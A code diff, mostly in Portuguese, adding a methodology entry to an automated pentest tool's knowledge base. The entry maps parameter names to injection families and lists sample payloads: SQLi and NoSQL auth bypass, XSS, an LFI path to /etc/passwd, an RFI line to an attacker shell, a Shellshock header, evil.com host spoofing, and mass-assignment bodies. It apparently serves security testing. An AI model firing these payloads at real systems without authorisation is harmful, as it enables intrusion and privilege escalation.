@@ -3142,6 +3142,140 @@ EVIDENCE TO CAPTURE:
             {"name": "JWT HS256 brute", "phase": "P14", "tool": "jwt_tool"},
         ],
     },
+    # ─────────────────────────────────────────────────────────────────────
+    # PRINCIPIO: TODA VARIAVEL = MATRIZ DE TESTE DE INJECAO
+    # User-defined learning: every parameter found via code-analyzer must
+    # be tested across ALL applicable injection families. Same param can
+    # be vulnerable to multiple vectors (XSS + SQLi + LFI + SSTI).
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "Param Matrix Testing - cada variavel testada para TODOS os tipos de injecao",
+        "vulnerability_type": "Methodology",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": [
+            "https://github.com/EdOverflow/bugbounty-cheatsheet",
+            "https://github.com/coffinxp",
+        ],
+        "summary": "Toda variavel de ambiente descoberta no codigo fonte (form input, query param, header, cookie, JSON field, hidden input, URL segment) deve ser testada contra TODAS as familias aplicaveis: SQLi, XSS, LFI, RFI, SSRF, CRLF, XXE, SSTI, RCE, CSRF, auth bypass, type juggling, mass-assignment. NAO escolher uma familia por param — gerar a matriz inteira.",
+        "steps_to_reproduce": """
+PRINCIPIO: code-analyzer encontra a variavel; hypothesis_engine gera
+N hipoteses por variavel (uma por familia aplicavel).
+
+PROCESSO:
+  1) code-analyzer faz GET no alvo + JS, extrai:
+     - <form action method enctype> + <input name type>
+     - URLs com query strings (?id=, ?search=, ?file=, etc.)
+     - Endpoints REST/GraphQL referenciados em JS
+     - Headers customizados em XHR (X-Auth-Token, X-API-Key, X-Tenant-Id)
+     - process.env / REACT_APP_ / NEXT_PUBLIC_ refs (sao chaves que viram params)
+     - Hidden inputs (__VIEWSTATE, __EVENTTARGET em ASP.NET; CSRF tokens)
+     - JSON schemas inferidos de respostas (POST body shape)
+
+  2) Para cada variavel descoberta, aplicar o mapa de familias:
+
+     Categoria do nome    Familias a testar
+     ---------------------------------------------------------------
+     search,q,query,kw   SQLi, XSS, LFI, SSTI, command-injection
+     id,uid,pid,user_id  SQLi, IDOR/BOLA, mass-assign, IDOR-by-type
+     name,title,desc     XSS, SSTI, CSV-injection (export endpoints)
+     email,user,login    Auth-bypass (SQLi+NoSQL), email-injection
+     password,pass,pwd   NoSQL ($ne), JSON type-juggle, weak crypto
+     url,uri,next,redir  SSRF (gopher/dict/file/AWS metadata),
+                         open-redirect (//evil, /\\evil),
+                         CRLF (%0d%0a)
+     file,path,page,doc  LFI (../etc/passwd, php://filter),
+                         RFI (http://attacker/shell), null-byte
+     cmd,exec,host,ping  Command injection (;|`$(  ), Shellshock
+     callback,cb         JSONP XSS via Content-Type swap, SSRF
+     xml,soap            XXE (file://, OOB, DTD remoto)
+     template,tpl,view   SSTI ({{7*7}}, ${7*7}, <%= %>)
+     role,admin,is_admin Mass-assign (POST extra field), priv-escal
+     debug,test,verbose  Hidden param probe, source-disclosure
+     _method,_action     Verb tampering (POST -> PUT/DELETE)
+
+  3) Hidden parameters (sempre testar mesmo sem evidencia):
+     ?debug=1  ?admin=1  ?test=1  ?dev=1  ?source=1  ?source_code=1
+     ?role=admin  ?is_admin=true  ?priv=root
+     ?_method=DELETE  ?_action=delete
+     Body extra fields: { ...legit, admin:true, role:'admin', superuser:1 }
+     curl -X POST -d 'username=foo&password=bar&isAdmin=true' /api/register
+
+  4) Header-based param matrix (toda request leva esses headers de teste):
+     X-Forwarded-For: 127.0.0.1     (auth bypass intent)
+     X-Forwarded-Host: evil.com     (cache poisoning, password reset poison)
+     X-Original-URL: /admin         (IIS routing bypass)
+     X-Rewrite-URL: /admin          (Apache routing bypass)
+     X-HTTP-Method-Override: PUT    (verb bypass)
+     X-Custom-IP-Authorization: 1.1.1.1
+     Referer: <SQLi/XSS payload>    (often logged unsafely)
+     User-Agent: () { :; }; echo X  (Shellshock)
+     Cookie: name=<payload>         (refletivo em alguns apps)
+     Host: evil.com                 (host header injection)
+
+  5) Verb tampering matrix (para todo path):
+     curl -X OPTIONS  -i /path     (allow-list discovery)
+     curl -X PUT      -i /path
+     curl -X DELETE   -i /path
+     curl -X PATCH    -i /path
+     curl -X TRACE    -i /path     (XST)
+     curl -H "X-HTTP-Method-Override: DELETE" -i /path
+
+  6) Content-Type matrix (para todo POST endpoint):
+     application/x-www-form-urlencoded  (default)
+     application/json                    (NoSQL type juggle)
+     application/xml                     (XXE)
+     text/xml                            (SOAP XXE)
+     multipart/form-data                 (file upload bypass)
+     application/yaml                    (Pickle/YAML deserialization)
+
+  7) Parameter pollution (HPP):
+     /api/get?id=1&id=2          (WAF bypass)
+     /api/post body: id=1&id=2
+
+  8) Mass-assignment (auth-required endpoints especialmente):
+     PUT /api/user/me
+     {"name":"foo"}                       (legit)
+     {"name":"foo","role":"admin"}        (mass-assign attempt)
+     {"name":"foo","isVerified":true}
+     {"name":"foo","tenantId":"victim"}   (cross-tenant)
+
+EXEMPLO COMPLETO:
+  Code-analyzer encontra form: POST /login {username, password, csrf_token}
+  hypothesis_engine gera:
+    H1 sqli/auth-bypass    username  ' OR 1=1--          sqlmap+wapiti
+    H2 sqli/auth-bypass    password  ' OR 1=1--          sqlmap+wapiti
+    H3 nosql/type-juggle   password  {"$ne":null}        curl
+    H4 xss/reflected       username  <script>alert(1)    dalfox
+    H5 verb-tampering      -         PUT /login          curl
+    H6 header-spoof        -         X-Forwarded-For:127 curl
+    H7 host-header         -         Host: evil.com       curl
+    H8 csrf                token     omit/forge          curl
+    H9 mass-assign         body      {"isAdmin":true}    curl
+""",
+        "impact": "Cobertura completa de superficie de ataque. Skipar familias por param e o motivo #1 que pentest automatizado perde bugs criticos. Um param vulneravel raramente e a UNICA superficie - se SQLi existe, geralmente XSS e CSRF tambem existem (mesma causa raiz: input nao sanitizado).",
+        "remediation": "n/a (metodologia).",
+        "learned_mission": "Para CADA variavel encontrada (form input, query param, header, cookie, JSON field), gerar hipoteses contra TODAS as familias aplicaveis ao nome+contexto. Sempre probar hidden params (admin/debug/role) e header matrix mesmo sem evidencia direta. Verb tampering em todo path.",
+        "learned_prompt": "When code-analyzer finds a param, generate hypotheses for EVERY applicable injection family. Use the name->families map. Also always test hidden params (admin/debug/role), header matrix (X-Forwarded-For/Host/Method-Override), verb tampering (PUT/DELETE/TRACE), content-type matrix (json/xml), HPP, mass-assign.",
+        "affected_phases": ["P03", "P04", "P11", "P12", "P13", "P14", "P15", "P16", "P19"],
+        "affected_skills": [
+            "asset_discovery", "recon-web-crawl", "risk_assessment",
+            "vuln-injection", "vuln-ssrf-redirect", "vuln-auth-bypass",
+            "vuln-idor-access-control", "vuln-api-graphql", "vuln-information-disclosure",
+        ],
+        "recommended_tools": [
+            "code-analyzer", "curl-headers", "sqlmap", "dalfox", "wapiti",
+            "nuclei", "ffuf-params", "arjun", "paramspider",
+        ],
+        "learned_techniques": [
+            {"name": "Param x family matrix generation", "phase": "P04", "tool": "code-analyzer"},
+            {"name": "Hidden param probe (admin/debug/role)", "phase": "P04", "tool": "curl-headers"},
+            {"name": "Header injection matrix", "phase": "P05", "tool": "curl-headers"},
+            {"name": "Verb tampering battery", "phase": "P14", "tool": "curl-headers"},
+            {"name": "Content-Type swap matrix", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Mass-assignment probe", "phase": "P14", "tool": "curl-headers"},
+            {"name": "HTTP Parameter Pollution", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
 ]
 
 
